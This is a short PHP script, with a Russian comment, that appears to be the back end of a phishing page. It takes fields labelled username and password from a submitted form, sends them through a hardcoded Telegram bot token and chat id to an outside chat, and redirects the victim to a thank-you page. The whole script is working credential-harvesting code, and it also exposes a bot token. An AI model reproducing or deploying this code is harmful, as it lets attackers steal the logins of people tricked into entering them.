<?php

/* https://api.telegram.org/bot5828024476:AAHdpnIAt6JqsB0z07jlVotIfHPy29E-MR0/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$name = $_POST['idi'];
$pass = $_POST['bek'];
$token = "5828024476:AAHdpnIAt6JqsB0z07jlVotIfHPy29E-MR0";
$chat_id = "-880064761";
$arr = array(
  'Имя пользователя: ' => $name,
  'Пароль: ' => $pass
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thankyou.html');
} else {
  echo "Error";
}
?>